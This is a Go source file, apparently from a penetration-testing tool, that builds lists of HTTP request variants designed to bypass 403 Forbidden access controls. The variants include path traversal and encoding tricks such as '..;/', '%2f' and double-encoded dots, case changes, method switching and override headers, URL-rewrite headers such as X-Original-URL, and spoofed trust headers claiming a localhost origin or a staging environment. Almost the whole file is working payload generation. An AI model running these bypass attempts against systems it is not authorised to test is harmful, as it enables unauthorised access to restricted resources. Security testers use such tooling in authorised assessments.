package bypass403

import (
	"net/url"
	"strings"
)

func BuildAttempts(rawURL, method string) []Attempt {
	if method == "" {
		method = "GET"
	}
	u, err := url.Parse(rawURL)
	if err != nil {
		return nil
	}
	path := u.Path
	if path == "" {
		path = "/"
	}

	var attempts []Attempt
	add := func(cat TechniqueCategory, label, m, targetURL string, headers map[string]string) {
		if targetURL == "" {
			return
		}
		attempts = append(attempts, Attempt{
			Category: cat, Label: label, Method: m, URL: targetURL, Headers: headers,
		})
	}
	join := func(p string) string {
		nu := *u
		nu.Path = p
		return nu.String()
	}

	// Path normalization variants
	add(PathNormalization, "double_slash", method, join(strings.ReplaceAll(path, "/", "//")), nil)
	add(PathNormalization, "dot_segment", method, join(path+"/./"), nil)
	add(PathNormalization, "parent_traversal", method, join(path+"/.."), nil)
	add(PathNormalization, "matrix_spring", method, join(path+"..;/"), nil)
	if strings.HasPrefix(path, "/") {
		add(PathNormalization, "semicolon", method, join("/;"+strings.TrimPrefix(path, "/")), nil)
		add(PathNormalization, "prefix_matrix_spring", method, join("/..;/"+strings.TrimPrefix(path, "/")), nil)
	}

	// Encoded path variants
	add(EncodedPath, "encoded_slash", method, join(strings.ReplaceAll(path, "/", "%2f")), nil)
	add(EncodedPath, "double_encoded_dot", method, join(strings.ReplaceAll(path, ".", "%252e")), nil)
	add(EncodedPath, "unicode_slash", method, join(strings.ReplaceAll(path, "/", "%ef%bc%8f")), nil)

	// Case variants
	if len(path) > 1 {
		segments := strings.Split(strings.Trim(path, "/"), "/")
		for i, seg := range segments {
			if seg == "" {
				continue
			}
			mutated := append([]string{}, segments...)
			mutated[i] = strings.ToUpper(seg[:1]) + strings.ToLower(seg[1:])
			add(CaseVariant, "segment_case_"+seg, method, join("/"+strings.Join(mutated, "/")), nil)
		}
		add(CaseVariant, "upper_path", method, join(strings.ToUpper(path)), nil)
		add(CaseVariant, "lower_path", method, join(strings.ToLower(path)), nil)
	}

	// Trailing slash/dot variants
	add(TrailingSlashDot, "trailing_slash", method, join(strings.TrimRight(path, "/")+"/"), nil)
	add(TrailingSlashDot, "trailing_dot", method, join(strings.TrimRight(path, "/")+"/."), nil)
	add(TrailingSlashDot, "trailing_semicolon", method, join(strings.TrimRight(path, "/")+"/;/"), nil)
	add(TrailingSlashDot, "trailing_space", method, join(strings.TrimRight(path, "/")+"%20"), nil)
	add(TrailingSlashDot, "matrix_traversal", method, join(strings.TrimRight(path, "/")+"/..;/"), nil)
	add(TrailingSlashDot, "dot_prefix_escape", method, join("/%2e/"+strings.TrimPrefix(path, "/")), nil)

	// Method changes
	for _, m := range []string{"HEAD", "POST", "OPTIONS", "TRACE", "PUT", "PATCH"} {
		if strings.EqualFold(m, method) {
			continue
		}
		add(MethodChange, "method_"+strings.ToLower(m), m, rawURL, nil)
	}

	// Method override headers
	add(MethodOverrideHeader, "x_http_method_override", "POST", rawURL, map[string]string{"X-HTTP-Method-Override": method})
	add(MethodOverrideHeader, "x_method_override", "POST", rawURL, map[string]string{"X-Method-Override": method})
	add(MethodOverrideHeader, "x_http_method", "POST", rawURL, map[string]string{"X-Http-Method": method})

	// Forwarded/original URL headers
	add(ForwardedURLHeader, "x_original_url", method, rawURL, map[string]string{"X-Original-URL": path})
	add(ForwardedURLHeader, "x_rewrite_url", method, rawURL, map[string]string{"X-Rewrite-URL": path})
	add(ForwardedURLHeader, "x_original_uri", method, rawURL, map[string]string{"X-Original-Uri": path})
	add(ForwardedURLHeader, "x_forwarded_prefix", method, rawURL, map[string]string{"X-Forwarded-Prefix": path})
	add(ForwardedURLHeader, "x_originating_url", method, rawURL, map[string]string{"X-Originating-URL": path})

	// Local/proxy IP trust and hop-by-hop headers
	refererURL := u.Scheme + "://" + u.Host + path
	for _, hdr := range []struct{ key, val string }{
		{"X-Forwarded-For", "127.0.0.1"},
		{"X-Forwarded-For", "::1"},
		{"X-Forwarded-For", "127.0.0.1, 10.0.0.1"},
		{"X-Real-IP", "127.0.0.1"},
		{"X-Client-IP", "127.0.0.1"},
		{"Client-IP", "127.0.0.1"},
		{"X-Originating-IP", "127.0.0.1"},
		{"True-Client-IP", "127.0.0.1"},
		{"X-Custom-IP-Authorization", "127.0.0.1"},
		{"X-Forwarded-Host", "localhost"},
		{"X-Host", "localhost"},
		{"Referer", refererURL},
		{"X-Environment", "staging"},
		{"X-Environment", "test"},
		{"X-Environment", "dev"},
		{"X-Environment", "local"},
		{"X-Forwarded-Server", "staging.internal"},
		{"X-Forwarded-Server", "dev.internal"},
		{"X-Forwarded-Server", "localhost"},
		{"X-Sec-Bypass", "true"},
		{"X-Allow-Internal", "true"},
		{"X-Debug-Mode", "1"},
	} {
		add(IPTrustHeader, strings.ToLower(hdr.key), method, rawURL, map[string]string{hdr.key: hdr.val})
	}

	// Protocol/port headers
	add(ProtocolPortHeader, "x_forwarded_proto", method, rawURL, map[string]string{"X-Forwarded-Proto": "https"})
	add(ProtocolPortHeader, "x_forwarded_port", method, rawURL, map[string]string{"X-Forwarded-Port": "443"})
	add(ProtocolPortHeader, "x_forwarded_scheme", method, rawURL, map[string]string{"X-Forwarded-Scheme": "https"})
	add(ProtocolPortHeader, "x_forwarded_ssl", method, rawURL, map[string]string{"X-Forwarded-Ssl": "on"})
	add(ProtocolPortHeader, "front_end_https", method, rawURL, map[string]string{"Front-End-Https": "on"})

	// Content negotiation variants
	add(ContentNegotiation, "accept_json", method, rawURL, map[string]string{"Accept": "application/json"})
	add(ContentNegotiation, "accept_xml", method, rawURL, map[string]string{"Accept": "application/xml"})
	add(ContentNegotiation, "accept_wildcard", method, rawURL, map[string]string{"Accept": "*/*"})
	add(ContentNegotiation, "accept_text_plain", method, rawURL, map[string]string{"Accept": "text/plain"})

	return attempts
}
